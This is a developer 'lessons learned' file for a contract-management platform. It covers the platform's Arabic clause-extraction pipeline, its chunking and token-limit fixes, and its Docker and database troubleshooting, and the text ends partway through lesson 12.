# lessons.md — SIGN + MANAGEX Platform
> This file documents every bug, issue, and fix that took significant time to resolve.
> Feed this file to Claude at the start of every session to avoid repeating mistakes.
> Last updated: 2026-07-13 (#236–#237 added — 7.20 Slice 4a Parties & Team directory DISPLAY (gated PR, CEO visual merge pending): **#236** a QA-seed browser pass catches real-data display bugs clean fixtures miss (em-dash separator token → "Q—" avatar initials; empty-string-vs-null job_title) — and when the seed cannot exercise a UI state (no INVITED party seeded), keep that state pinned by unit tests and NAME the gap in the PR instead of overclaiming "verified live"; **#237** `npx tsc` in a bare worktree resolves to npm's decoy tsc stub and exits 0 → a phantom-clean typecheck baseline (main really carries 1,158 pre-existing errors) — symlink the real node_modules, run the repo's own `.bin/tsc`, and prove deltas with `comm` on normalized error lists, never two grep counts. Prior same day: (#232–#235 added — multi-tier T0c doc-sync (DOCS-ONLY), after T0c-1 ContractParty backend + T0c-2 Parties Editor frontend merged (PRs #152/#154/#155, squash `fefbfcc`): **#232** `git diff main...branch` compares against LOCAL main, which lags origin after a merge — verify STOP conditions against `origin/main...branch` + the GitHub PR file list, never the stale-baseline three-dot diff (recurred at EVERY merge gate this arc); **#233** an FK's `ON DELETE` follows OWNERSHIP — CASCADE for owned children (`contract_parties` / `contract_party_contacts`) vs RESTRICT for independent records you must not orphan (`parent_contract_id`, #229) — decide per relationship, never inherit from a sibling FK; **#234** full-replace EMBEDDED children churn their ids freely, safe ONLY because the pin-freeze (`assertContractMutable` → 409 CONTRACT_PINNED) blocks edits exactly when a countersignature reference would first need stable ids — write the interlock down before the first durable token/invite is minted; **#235** a git-CLEAN auto-merge of two PRs touching the same structured files (#155/#156 both edited the 3 locales + `ContractDetailPage`) still needs POST-merge CI on the merged SHA + a parse/parity check (all locales parse, both key families survive, tabConfig entries unique) — git merges text, not i18n keys or config semantics. Prior 2026-07-12 (#229–#231 added — multi-tier T0b parent-linking doc-sync, PR #150 squash-merged to `main` at `04a2ba2`: **#229** a self-referential hierarchy FK uses `ON DELETE RESTRICT`, NOT `SET NULL` (T0b `contracts.parent_contract_id` diverged deliberately from the `LegalDocument.parent_law_id` SET NULL template — a child contract losing its parent link is a silent orphan; verified `confdeltype='r'`, delete-with-children rejects); **#230** a create-path guard can be correct + worth keeping even when unreachable at create time (a brand-new row has no id so a self/cycle can't form on create, but the cycle guard still rejects linking under already-corrupt ancestry, bounds chain depth cap-64, and is editable-parent-ready via a threaded `selfId` — don't delete as dead code, document why it can't fire); **#231** `ContractsService.create()` maps fields EXPLICITLY (never spreads the DTO) so a newly persisted column (`parent_contract_id`) MUST be added to the create() literal or it silently drops — prove it with a persistence test that reloads the row from real Postgres. The entity→frontend-type mirror candidate was SKIPPED as already covered by #210. Prior 2026-07-07 (#214–#217 added — Risk-tab rework, PR #137, merged `8a21274`: **#214** `order_index` numbers from 0 PER DOCUMENT so a flat clause sort interleaves multi-doc contracts — group by `document_priority` first and share ONE ordering expression across the risk read + clause read; **#215** a NULL-FK-as-isolation (`source_document_id=NULL` keeps the AI proposal out of the guest panel) MUST be restored from the parent on the promoting transition or merged clauses fall out of their document group — prove both halves; **#216** never run the full real-PG suite concurrently with manual DB transactions on the shared dev DB (4 phantom failures; clean re-run 1247 green); **#217** a corpus-mutating live smoke test needs a pre-captured verified revert plan — ids + `md5(content)` before, byte-identity + orphan sweep + count baseline after. Prior 2026-07-05 (#202–#213 added by other sessions — guest-chat slices 2–3 + 7.20 slices 1–2). Prior 2026-07-05 (#201 added — Phase-8.3 annotation review tooling (PR #130): editable Risk Analysis tab (human-correctable LEVEL + CATEGORY dropdowns; CATEGORY uses the 17 clause-type labels, NOT the 8 broad risk buckets — the AI's real free-text categories map onto clause types; reuses PATCH /risk-analysis/:id; snapshots the AI original via `is_edited_by_user` + `original_risk_level`/`original_risk_category` = was_corrected) + party editing (Swap First⇄Second + `original_party_*` / `is_parties_edited_by_user` tracking; party-name editing pre-existed, the root reversed-party EXTRACTION regex bug is backlog). THE APP-WIDE lesson: the 17 clause-type category labels had NO Arabic anywhere — a gap that also hit the EXISTING clause-type dropdown, fixed at a shared `clauseTypeLabel` source + `clauseType.*` i18n (en/ar/fr) + RTL dropdown positioning. Arabic category + `parties.swap` terms are DRAFT `_TODO` pending Youssef's legal review. Additive migrations 1764000000001 / 1765000000001. Prior 2026-07-04 (#199–#200 added — doc-gap backfill for two PRs that merged today with docs deferred. **#199** — chunk-reassembly (PR #117): content-aware dedup keys on normalized CONTENT (not `section_number`/`title`) so a combined GC+PC file keeps BOTH same-number clauses while a true chunk-overlap dup still merges, and split-clause stitching fires only behind adjacent + same-section + junction-overlap (section-number-alone is the GC/PC collision trap); flags `clause_dedup_dropped`/`split_clause`/`combined_conditions_file`; large-clause stitch-threshold + oversized-multi-article-block chunking edge cases (un-stitch / over-fragment text-loss) stay on the backlog. **#200** — the per-clause risk feature (PR #126) was LATENTLY broken: `risk_analyses` sat empty until the Phase-8.3 pre-labeling pass exposed (a) a bare `json.loads()` on the model's fenced ```json output → 0 risks on every call (a verbatim, un-generalized recurrence of #166) and (b) a `clauses.id` stored into `contract_clause_id`, violating the FK to `contract_clauses(id)`; fixed with a fence-/truncation-tolerant `_parse_risk_array` + junction-id mapping (rolled-back real-PG FK proof). Prior 2026-06-27 (#179 added — ERP crypto round-trip TEST fix (PR #100): a crypto round-trip test must encrypt AND decrypt through ONE key/instance (the production DI `CryptoService`) under a real production-shaped key — the test had a hand-rolled second instance pinned to a dummy key, and `@nestjs/config` gives `process.env` precedence over `load()` unless `ignoreEnvVars: true`, so it failed under a real env key and passed for the wrong reason under none; fix = decrypt via `moduleRef.get(CryptoService)`. Prior #173–#178 (Youssef): Arabic-PDF Acrobat-strict rendering fix — watermark assertion via FlateDecode+hex-TJ (#173), full-Amiri embed + `/CIDToGIDMap` over fontkit's strict-rejected subset (#174), trust real Acrobat over in-container PDF tools (#175), gate external-binary test deps behind a presence check (#176) — plus guest-upload feature #4: never hold a lock across a heavy op to enforce a cap (#177), stale-Vite-bundle vs code defect + i18n-mocked test gap (#178). Prior 2026-06-21 (#172 added — Phase 7.35: `users.mfa_totp_secret` encrypted at rest via CryptoService (PR #88), reusing `ERP_CREDENTIAL_ENC_KEY`. #172: migrating a LIVE-AUTH secret to encryption-at-rest without lockout — version-prefixed dual-read (`startsWith('v1.') ? decrypt : as-is`) on every read path so reads tolerate both states regardless of code-deploy vs migration ordering, paired with a forward-only idempotent (`NOT LIKE 'v1.%'`) migration that throws + modifies zero rows if the key is missing; encrypt-on-write hard-fails (no silent plaintext), making the shared key functionally required for MFA enrollment too. Prior #170–#171 — Phase 7.28 ERP Integration shipped end-to-end (v1 + v1.1, PRs #79–#83). #170: org-scoped tables (direct `organization_id`, e.g. `erp_connections`) are NOT contract-scoped — the Option B `no-bare-contract-repo` lint chokepoint guards only the 24 contract-rooted entities, so cross-tenant SYSTEM_ADMIN admin is made safe by role-gate + reason-required immutable audit (the `admin-organizations` precedent), not a repository wall; verify with the lint gate (exit 0, no exemption) before assuming the chokepoint applies. #171: notify-on-delete ordering — resolve recipients BEFORE the hard delete, dispatch (best-effort, never-throw) AFTER it commits. Prior 2026-06-16 (#169 added — `CryptoService` AES-256-GCM encryption-at-rest utility shipped (PR #73), the codebase's first encryption-at-rest primitive; key `ERP_CREDENTIAL_ENC_KEY` is fast-hashed so it MUST be high-entropy random). Prior 2026-06-10: Phase 7.27 Legal Corpus shipped end-to-end — full ingestion pipeline (StorageService → text extraction → NFKC + tiktoken-based chunking → OpenAI text-embedding-3-small → pgvector HNSW retrieval), AI Chat wired as first consumer with async polling, force-OCR path for broken-font PDFs (Egyptian Tax Authority), source-level flags for per-country quirks (is_visual_order, force_ocr). Lessons #153–#167 capture the 15 substantive learnings: docker-compose restart vs up -d (#153), nest --watch boot hang refinements (#154–#155), StorageService folder allowlist (#156), TypeORM can't own pgvector (#157), Python mocking at source (#158), UTF-8 test harnesses (#159), pdf2image OOM (#160), Celery on_failure backstop (#161), ToUnicode CMap lossy corruption (#162), Arabic logical-order embeddings (#163), investigation grep-verify (#164), project.country normalization (#165), Claude fenced JSON parsing (#166), polling result-nesting discipline (#167). #168 — migration timestamp hygiene: duplicate migration timestamps don't make TypeORM silently skip (it keys on class name + timestamp), but create undefined ordering between same-timestamp files; always pick a timestamp strictly greater than the largest existing one. Work committed local-only on `feature/7-27-legal-corpus`, unpushed. Prior #148–#150 (2026-06-04) — engine-earned by the Phase 7.18 metering primitive (commit `dc31bb6`): TypeORM 0.3 `manager.query()` returns `[rows, rowCount]` for UPDATE+RETURNING and the affected-count read must route through a normalising helper (NEVER hand-index `result[1]`); read-then-write status transitions double-refund under concurrent commit/release on the same row; existence-check-then-insert is racy for idempotency and the insert-first / ON CONFLICT DO NOTHING shape is the fix. Prior #143–#147 (2026-06-02) — TypeORM auto-appends _enum suffix + audit ALL locales on i18n tasks + missing @RequirePermission silently disables auth + hand-applied secret-stripping doesn't scale + nest start --watch hot-reload contaminates before/after verification.)

---

## How to Use This File
- Read this file at the start of every Claude session
- Add new lessons after every bug that took more than 30 minutes to fix
- Format: Problem → Root Cause → Fix → How to Avoid

---

## 📋 Table of Contents
1. Clause Extraction — max_tokens too small
2. Clause Extraction — Wrong Arabic clause patterns
3. Clause Extraction — Sub-articles split as separate clauses
4. Clause Extraction — Cover page trimming too aggressive
5. Clause Extraction — Large documents timing out (chunking solution)
6. Clause Extraction — Tiny orphan chunks crashing extraction
7. Clause Extraction — Oversized single articles still too large after chunking
8. Clause Extraction — Chunk boundaries splitting articles in half
9. Clause Extraction — TOC entries extracted as real clauses
10. Clause Extraction — Cross-references mistaken as clause headings
11. Clause Extraction — Duplicate clauses from overlapping chunks
12. Clause Extraction — API costs too high (tiered max_tokens fix)
13. Clause Extraction — Definitions clause not formatted as bullet points
14. Docker — bcrypt binary fails on Windows
15. Docker — CRLF line endings crash entrypoint on Linux
16. Docker — Celery worker code changes not taking effect
17. Docker — Concurrency set to 1 (all documents process sequentially)
18. Docker — Celery tasks killed at 600s (large documents always fail)
19. Word File Extraction — Tables and headers missing
20. Database — Orphaned clauses inflating dashboard count
21. Frontend — currentUser always null after page refresh
22. Frontend — Arabic text displaying left-to-right
23. Frontend — Comment edit/delete icons not showing
24. Frontend — Portal chooser redirect loop for admin users
25. GitHub — Personal access token expiring
26. GitHub — Mac osxkeychain interfering with token
27. Clause Extraction — مادة (N) prefix appearing in clause content
28. Docker — Backend not rebuilt after colleague adds npm packages
29. Security — Secrets Audit Before AWS Deployment
30. Frontend — Hardcoded localhost:5175 CENVOX Backlinks in SIGN Layouts
31. Backend — Silent Catch Blocks Masking Critical Failures
32. Backend — Paymob Webhook Activation Needs Idempotency Before Fix
33. Docker — New npm Package Not Found After Rebuild
34. Backend — New Required Joi Var Breaks Teammates' Environments
35. Testing — AuthService Has 14 Constructor Dependencies
36. Testing — Vite Config Must Stay Untouched, Use Separate vitest.config.ts
37. Testing — Mock at Service Level Never at Axios Level
38. Testing — pytest.ini Must Set pythonpath = . or All Imports Fail
39. Testing — Celery bind=True Tasks Need .run(payload) Not task(None, payload)
40. DTOs — Fields Without Class-Validator Decorators Are Silently Stripped
41. Defense-in-Depth — Frontend Filters Are Never Enough
42. @MaxLength — Apply to BOTH Create AND Update DTOs
43. sanitize-html — Correct Import Syntax When esModuleInterop Is Off
44. Rebrand — Parent Brand Switched from CENVOX to MANAGEX
45. Preview — Vite Cannot Bind 5175 While Docker Is Running
46. Ports — 5175 Is the Canonical MANAGEX Landing Port
47. Coordination — "Done" = On Main With Green CI, Never "Pushed to a Branch"
48. Rebrand — Always Run a Negative-Filter Sweep After a Big Rename
49. Coordination — Rebasing Requires Pulling BEFORE Opening a PR
50. gitignored Files Are Invisible to Rebrand Sweeps
51. gh CLI — workflow Scope Required to Push CI Workflow Files
52. Coordination — Open a DRAFT PR Within 24–48 Hours of Branch Creation
53. Post-Merge — Always Verify Phase 3.2 Artifacts Survived
54. SQL Injection — TypeORM Parameterization Is Already There by Default
55. LIKE Wildcard Leakage vs SQL Injection — Different Problems
56. New ILIKE Sites Need escapeLikeParam() When Branches Merge
57. Mass Assignment via Partial<Entity> — Never Use Entities as DTOs
58. Plain TypeScript Interfaces Get Zero Validation from class-validator
59. Every Inline @Body() Object Is a Validation Gap
60. multer memoryStorage Has No Size Limit by Default
61. Path Traversal in File Serving — Always Contain Paths
62. Optional Chaining on Methods That Return Objects
63. IP Extraction Must Use a Single Shared Utility
64. app.set('trust proxy', ...) Must Be Set Before Any IP-Based Middleware
65. Auth Error Messages Must Never Distinguish Between Failure Reasons
66. Rate-Limit Storage Must Be Redis-Backed in Production
67. Named Throttlers Are Not Per-Method — You Must Skip the Others
68. Email Template Injection — User Strings Must Be HTML-Escaped at Output
69. CSP connectSrc Must Include Your Production API Origin
70. Two Types of HTML Escaping — Input Sanitization vs Output Escaping
71. Token Family Tracking Is the Correct Reuse-Attack Response
72. Access Token Blacklisting Requires jti Claims
73. Every Login Path Must Call _finalizeLogin
74. SessionTrackingMiddleware Must Key on jti, Not Token Hash
75. Dual Storage Is Technical Debt That Must Be Retired Promptly
76. DB Family Revocation Does Not Invalidate Live Access Tokens
77. Stale Service Mocks Break CI When New Methods Are Added
78. Multiple DTOs With the Same Name — Always Trace the Actual Endpoint
79. Never Test Destructive Endpoints With Real User Credentials on a Live Database
80. Password Validation Audit Must Cover ALL DTOs With a Password Field
81. Testing — Frontend npm ci Must Run From Repo Root, Not apps/sign/
82. Docker — docker restart Does Not Reload .env — Use docker-compose up -d
83. Frontend — Vite Env Vars Silently Render Undefined, No Crash (Unlike Backend Joi)
84. Security — Multiple Frontend Pages Can Route to Different Backend Endpoints for the Same Feature
85. Frontend — Browser Default Fonts Do Not Inherit Into Button and Input Elements
86. UI — Audit the Live Section Background Before Specifying Card Surface Colour
87. Architecture — Replace Brittle String-Split Render Logic With Index-Based Logic
88. Tooling — Claude Code Has No /plugin Command — Extensibility Is via Custom Commands, MCP, Hooks, and Skills
89. Frontend — The Layout Shell Is the Mobile Blocker; Fix It First
90. Off-canvas Sidebar Pattern for React + Tailwind
91. Tailwind — `md:` Sorts BEFORE `ltr:` / `rtl:` in the Stylesheet
92. AdminLayout Is LTR-Only — No `ltr:` / `rtl:` Variants Exist or Are Needed
93. Process — Verify Prompt Assumptions Against Actual Code Before Implementing
94. PostgreSQL — ADD CONSTRAINT IF NOT EXISTS is invalid syntax
95. DTO Design — @ValidateIf for mutually exclusive fields (XOR validation)
96. Testing — Mock guards must THROW to produce 401, not return false
97. Plan-Gating UI — Defer When the Tier Model Doesn't Exist Yet
98. Reuse Existing Service Types — Don't Re-Declare Across Service Files
99. Inserting a Tab Into a 2,308-Line File — Three Edit Points, In Order
100. react-big-calendar — Wire the date-fns Localizer Per-Language
101. The Two-Step File Upload — Evidence URL Today, Multipart Later
102. Drawer vs Modal — When to Use Which
103. Silent catch in TypeORM migrations hides type-name bugs (recurrence of #31)
104. Real-time deviation reporting > post-hoc commit-message justification
105. `useState + useEffect` for periodically-changing server data is silently stale
106. Shared queryKey for cross-component cache coherence
107. `refetchIntervalInBackground: false` keeps backend load proportional to active users
108. NestJS — Cross-Controller Route Shadowing: Dynamic `:id` Routes Shadow Static Routes in Later-Registered Controllers
109. PostgreSQL — ALTER TYPE ADD VALUE Requires `transaction = false` in TypeORM Migrations
110. NestJS Testing — `ThrottlerGuard` Cannot Be Resolved Without `ThrottlerModule` — Always `.overrideGuard(ThrottlerGuard)`
111. Migration Audit Pattern — `EXCEPTION WHEN` Is Never Safe; Always Use `IF NOT EXISTS` Subquery
112. Email — `FROM_EMAIL` vs `EMAIL_FROM` env var mismatch causes silent wrong-sender address
113. NestJS — Symbol + `useFactory` Provider Pattern for Swappable Infrastructure Adapters
114. Email — Fire-and-Forget Callers Must Catch at the Caller Level, Not Inside the Shared Send Method

---

## 1. Clause Extraction — max_tokens Too Small

**Problem:**
- Clause extraction was returning 0 clauses
- No error shown in UI
- JSON responses were being cut off mid-string

**Root Cause:**
- `max_tokens` was hardcoded to `8192` in `clause_extractor.py`
- Arabic contracts with 20+ clauses require 15,000–25,000 output tokens
- Claude was generating correct JSON but hitting the token limit mid-response
- `json.loads()` then threw `JSONDecodeError` on the truncated response

**Fix:**
- Implemented tiered `_calculate_max_tokens()` method:
  - Chunks < 10,000 chars → 16,000 tokens
  - Chunks < 20,000 chars → 24,000 tokens
  - Chunks >= 20,000 chars → 32,000 tokens
- This saves 50-75% vs old hardcoded 64,000

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- Never hardcode `max_tokens` for Arabic content
- Arabic JSON output is larger than estimated — always add 50% buffer
- Always check celery logs for JSONDecodeError when clauses = 0

---

## 2. Clause Extraction — Wrong Arabic Clause Patterns

**Problem:**
- Particular Conditions clauses not being recognized
- Extraction returning 0 clauses even with correct text
- The document used `مادة (1)` format but prompt only handled `المادة (1)`

**Root Cause:**
- SYSTEM_PROMPT only listed: `"المادة 1"`, `"المادة (1)"`, `"مادة رقم"`
- Missing the most common Egyptian government contract format: `مادة (1)` (without ال article)
- Also missing: `مادة (١)` Arabic-Indic numerals, `مادة رقم (١)`, `مادة 1` without brackets

**Fix:**
- Added all مادة variations to Guideline 8 in SYSTEM_PROMPT:
  - `مادة (1)` / `مادة (١)` — Western or Arabic-Indic in brackets
  - `مادة رقم (1)` / `مادة رقم (١)` — with رقم
  - `مادة 1` / `مادة ١` — no brackets
  - `المادة 1` / `المادة (1)` / `المادة رقم` — with definite article
- Also added البند رقم (N) format for Contract Agreement documents

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- Egyptian government contracts use `البند رقم (N):` format
- Particular Conditions use `مادة (N)` format
- General Conditions use `مادة (N) : title :` format
- Always check actual document text before assuming clause marker format
- Run: `SELECT LEFT(extracted_text, 500) FROM document_uploads WHERE ...`

---

## 3. Clause Extraction — Sub-articles Split as Separate Clauses

**Problem:**
- Particular Conditions: 16 clauses extracted but structure was wrong
- Sub-articles like `9-1`, `9-2`, `9-3` were extracted as separate top-level clauses
- مادة 12 with sub-articles 12-1 through 12-10 created 10 separate clauses instead of 1

**Root Cause:**
- SYSTEM_PROMPT Guideline 3 said "each clause should be atomic" with no exception for sub-articles
- Claude treated `9-2`, `9-3` as "separate" and made them atomic
- No rule existed to explain that N-M and N/M patterns are sub-articles not top-level clauses

**Fix:**
- Updated Guideline 3: Added explicit sub-article exception
- Added Guideline 10: "Everything from مادة (N) to مادة (N+1) = ONE clause"
- Sub-articles numbered N-M (dash) or N/M (slash) must stay inside parent مادة
- `clause_number` should always be the parent number, never the sub-article number

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- Always verify sub-article containment after first extraction
- Check DB: `SELECT clause_number, title FROM clauses WHERE source_document_id = '...'`
- If you see clause_number like "9-2" or "4/1" — sub-article rule is broken

---

## 4. Clause Extraction — Cover Page Trimming Too Aggressive

**Problem:**
- Particular Conditions extraction was missing Articles 1-8 completely
- First extracted clause had no section number and started mid-article
- General Conditions started from wrong position in document

**Root Cause:**
- `trimCoverPages()` in `document-processing.service.ts` matched `تم الاتفاق` pattern
- This phrase appeared inside a sub-article body (not just on the cover page)
- The function cut everything before that match — deleting Articles 1-8

**Fix:**
- For Conditions documents (Particular/General): now searches for FIRST `مادة` marker
- Pattern: `/مادة\s*[\(\s]?[١-٩\d]/`
- For Agreement documents: kept existing behavior (searches for `تم الاتفاق` first)
- Document type detected by label: conditions/شروط/general/particular/spec/مواصفات

**File:** `backend/src/modules/document-processing/document-processing.service.ts`

**How to Avoid:**
- After reprocessing always verify: `SELECT LEFT(extracted_text, 200) FROM document_uploads WHERE ...`
- Text should start at the first real clause marker not mid-sentence
- Never use broad Arabic phrases as cover page markers — they appear in body text too

---

## 5. Clause Extraction — Large Documents Timing Out (Chunking Solution)

**Problem:**
- General Conditions (81,315 chars) always timed out
- Task was killed at exactly 600 seconds every time
- Retry loop: killed → NestJS retried → killed again → infinite loop
- Single API call for 70k+ chars is too large for Claude to process reliably

**Root Cause:**
- Sending the entire document in one Claude API call
- Claude needs 8-10 minutes just for the API call on 70k+ char documents
- No chunking strategy existed — all or nothing approach

**Fix — Chunking Implementation:**
- Documents > 30,000 chars → automatically use `_extract_chunked()` method
- Documents <= 30,000 chars → use `_extract_single()` (existing behavior unchanged)
- Chunk size: `_CHUNK_SIZE = 15,000` chars maximum
- Split at `مادة` article boundaries using `_ARTICLE_BOUNDARY_RE` regex
- Each chunk processed by separate Claude API call sequentially
- Results merged and deduplicated after all chunks complete

**Key Methods Added to clause_extractor.py:**
- `_extract_single()` — existing logic moved here for small documents
- `_extract_chunked()` — orchestrates chunking for large documents
- `_split_on_article_boundaries()` — splits text at مادة markers respecting chunk size
- `_merge_small_chunks()` — merges tiny leftover fragments (< 500 chars) into previous chunk
- `_break_oversized_chunk()` — handles single articles that still exceed chunk size
- `_add_article_context()` — prepends مادة heading when chunk starts mid-article
- `_group_by_boundaries()` — groups text into ≤ max_size pieces with overlap
- `_calculate_max_tokens()` — dynamic token limit based on chunk size
- `_call_api_with_retry()` — handles 529/connection errors with exponential backoff
- `_parse_json()` — graceful JSON parsing with empty response handling

**Fix — Docker Settings in docker-compose.yml:**
- `--concurrency=1` → `--concurrency=3` (3 docs in parallel)
- `--time-limit=2400` (40 minutes hard limit)
- `--soft-time-limit=1800` (30 minutes soft limit)
- Memory: 2G → 3G to support 3 parallel workers
- Added source code volume mount: `./ai-backend:/app`

**Files:**
- `ai-backend/app/agents/clause_extractor.py`
- `docker-compose.yml`

**How to Avoid:**
- Any document over 30,000 chars MUST use chunking automatically
- Never send full large Arabic document in one API call
- Check document size: `SELECT length(extracted_text) FROM document_uploads WHERE ...`
- Expected chunk count: document_chars / 15,000 = approximate number of chunks
- General Conditions (81k chars) → ~9-12 chunks → ~20 minutes total

---

## 6. Clause Extraction — Tiny Orphan Chunks Crashing Extraction

**Problem:**
- After implementing chunking, extraction kept failing on chunk 3
- Error: `Expecting value: line 1 column 1 (char 0)` — empty JSON response
- A 202-character chunk was being sent to Claude
- Claude returned prose instead of JSON for tiny fragments
- Entire task failed when one chunk failed

**Root Cause:**
- `_split_on_article_boundaries()` was creating tiny leftover fragments
- When splitting large articles, small text pieces (202 chars) were left as separate chunks
- Claude cannot extract clauses from 202 chars and returned empty/prose response
- Empty response caused `json.loads()` to crash the entire task

**Fix:**
- Added `_merge_small_chunks()` method:
  - Any chunk < 500 chars gets merged into the PREVIOUS chunk
  - Prevents orphan fragments from reaching Claude API
- Min chunk skip threshold raised: 100 → 500 chars as extra safety net
- Graceful error handling in chunk processing loop:
  - If one chunk fails → log warning and continue with next chunk
  - Never crash entire task due to one bad chunk

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- Always run `_merge_small_chunks()` after splitting before processing
- Log chunk sizes when extraction starts — check for any chunk < 500 chars
- If you see "Expecting value: line 1 column 1" — a tiny chunk is the cause
- Check logs for: "Merging tiny chunk (N chars) into previous chunk"

---

## 7. Clause Extraction — Oversized Single Articles Still Too Large After Chunking

**Problem:**
- Even after implementing 15,000 char chunks, Article 1 (Definitions) in General Conditions was 44,378 chars
- This single article exceeded the chunk size — sent as one 44k chunk
- Claude took 9+ minutes to process it — nearly hitting timeout again
- The basic chunking only split at مادة boundaries, so a huge single article stayed huge

**Root Cause:**
- `_split_on_article_boundaries()` split ONLY at مادة markers
- Article 1 (Definitions) has no sub-مادة markers — it's one massive definitions article
- Result: chunk 1 = 44,378 chars (too big), causing slow API response
- The chunk size limit was not enforced when a single article exceeded it

**Fix:**
- Added `_break_oversized_chunk()` method with 3-level fallback:
  1. **Level 1:** Split at sub-article boundaries (`_SUB_ARTICLE_RE`: N-M or N/M patterns)
  2. **Level 2:** Split at paragraph boundaries (`\n\n`)
  3. **Level 3:** Hard cut every 15,000 chars with 200-char overlap (last resort)
- Added `_group_by_boundaries()` helper: groups text into ≤ max_size pieces at given split points
- Added `_SUB_ARTICLE_RE` regex: `r"(?m)^[١-٩\d]{1,3}\s*[-/]\s*[١-٩\d]{1,3}"`
- Result: 44,378-char Article 1 now splits into ~3 sub-chunks of ~15k chars each
- Processing time improved: 9.5 minutes → ~3 minutes per sub-chunk

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- After splitting, check if any chunk exceeds `_CHUNK_SIZE` (15,000 chars)
- Arabic Definitions articles (مادة 1 in General Conditions) are almost always oversized
- Look for log message: "Oversized chunk (N chars) → M pieces at paragraph boundaries"
- Expected result for General Conditions: 81k chars → 9-12 chunks of 8-15k each

---

## 8. Clause Extraction — Chunk Boundaries Splitting Articles in Half

**Problem:**
- General Conditions extracted 56 clauses instead of correct 38
- Sub-articles of مادة 12 were extracted as separate top-level clauses
- Some clause content started mid-sentence
- Chunk 2 started mid-article and Claude extracted the continuation as new clauses

**Root Cause:**
- Chunking split at 15,000 char boundaries
- Sometimes a chunk ended in the MIDDLE of a large article (like مادة 12)
- The next chunk started mid-article with no مادة header context
- Claude saw the continuation text and extracted it as new standalone clauses

**Fix:**
- Added `_add_article_context()` method:
  - Checks if chunk starts with a مادة marker using `_ARTICLE_BOUNDARY_RE`
  - If NOT → finds the last مادة heading from the previous chunk
  - Prepends that heading to give Claude the article context
- Added explicit instruction to Claude prompt for each chunk:
  ```
  "CHUNK {i+1} OF {total}:
  Only extract clauses that START in this chunk.
  A clause STARTS when you see a مادة marker at the beginning of a line.
  Do NOT extract content that is a continuation of a clause that started before this chunk."
  ```
- Result: Chunk 2 starting mid-article → Claude correctly returns 0 clauses (recognized as continuation)
- General Conditions went from 56 wrong clauses → 38 correct clauses

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- After chunked extraction always verify total clause count matches expected document count
- If clause count is HIGHER than expected → chunk boundary issue
- Check: `SELECT clause_number, title FROM clauses WHERE source_document_id = '...' ORDER BY clause_number`
- Look for clause_numbers like "9-2" or clauses with very short content (< 50 chars)
- Check logs for: "Chunk X starts mid-article — prepending heading: مادة (N)..."

---

## 9. Clause Extraction — TOC Entries Extracted as Real Clauses

**Problem:**
- General Conditions document has a Table of Contents appended at the end of extracted text
- TOC contains entries like: `مادة (1) : تعريفات وتفسيرات ......... 4`
- Claude was extracting these TOC entries as real clauses (creating duplicates)

**Root Cause:**
- TOC entries look identical to real article headings syntactically
- Original Guideline 7 said "skip table of contents" but wasn't specific enough
- Claude couldn't reliably distinguish TOC from real articles
- Word file extractor appends table content (including TOC tables) at the END of extracted text

**Fix:**
- Strengthened Guideline 7 with specific TOC identification rules:
  - TOC identified by: مادة (N) followed by dotted lines (`......`)
  - Standalone page numbers on their own lines between entries
  - Multiple مادة entries listed sequentially with NO body text between them
  - ALL such entries must be completely skipped — never extracted as clauses

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- Word files often append the TOC table at the END of extracted text
- Always verify extracted text end: `SELECT RIGHT(extracted_text, 500) FROM document_uploads WHERE ...`
- If you see dotted lines and page numbers → TOC is appended and needs Guideline 7
- TOC pattern: `مادة (N) : title ......... page_number`

---

## 10. Clause Extraction — Cross-References Mistaken as Clause Headings

**Problem:**
- General Conditions body text contains phrases like:
  `طبقا للمادة (22) من هذه الشروط العامة`
- These look identical to real clause headings syntactically
- Claude was creating phantom clauses from inline cross-references

**Root Cause:**
- `مادة (N)` appears both as real headings AND as cross-references in body text
- No rule existed to distinguish between them
- Real heading: `مادة (12) :` at start of line followed by title
- Cross-reference: `مادة (22)` mid-sentence after من/طبقا/بموجب

**Fix:**
- Added Guideline 11: Real article headings vs cross-references
- Real heading characteristics: مادة (N) at START of line + colon + title + body text follows
- Cross-reference characteristics: مادة (N) mid-sentence preceded by:
  - من / طبقا للمادة / بموجب مادة / أحكام مادة / وفقاً للمادة / تطبيق مادة
- Cross-references are NEVER clause boundaries — always ignore them

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- Any Arabic contract document with frequent article cross-references needs Guideline 11
- FIDIC-based Arabic contracts are especially prone to this issue
- Check for phantom clauses: clauses with no body text or very short content (< 50 chars)
- Phantom clauses from cross-references usually have no title or generic titles

---

## 11. Clause Extraction — Duplicate Clauses from Overlapping Chunks

**Problem:**
- After chunked extraction, duplicate clauses appeared in the database
- Same clause extracted by two adjacent chunks
- Total clause count was inflated

**Root Cause:**
- When a chunk boundary fell near a مادة heading
- Both the previous chunk (end) and next chunk (start) extracted the same clause
- No deduplication was happening after merging all chunk results

**Fix:**
- Added deduplication by normalized title after merging all chunks:
  - `seen_titles` set tracks extracted clause titles
  - First occurrence kept, subsequent duplicates silently dropped with debug log
- Also added deduplication by clause_number as secondary check

**File:** `ai-backend/app/agents/clause_extractor.py`

**How to Avoid:**
- Always run deduplication after merging chunk results
- Check for duplicates:
  ```sql
  SELECT clause_number, COUNT(*) FROM clauses
  WHERE source_document_id = '...'
  GROUP BY clause_number HAVING COUNT(*) > 1
  ```
- If duplicates found in DB (cleanup query):
  ```sql
  DELETE FROM clauses WHERE id NOT IN (
    SELECT MIN(id) FROM clauses
    WHERE source_document_id = '...'
    GROUP BY clause_number
  )
  ```

---

## 12. Clause Extraction — API Costs Too High

**Problem:**
- Anthropic API costs were much higher than expected
- `max_tokens=64000` was hardcoded — paying for 64k tokens even when only 5k used
- With 9 chunks per document × 64,000 max_tokens = massive unnecessary cost

**Root Cause:**
- Original fix for truncation (Lesson 1) set max_tokens to 64,000 globally
- Arabic contracts with 15k char chunks only need ~16,000-24,000 output tokens
- Paying for 64,000 but using maybe 10,000 = 6x more expensive than needed

**Fix:**
- Replaced hardcoded 64,000 with tiered `_calculate_max_tokens()` method:
  - Chunk < 10,000 chars → max_tokens = 16,000 (saves 75% vs 64k)
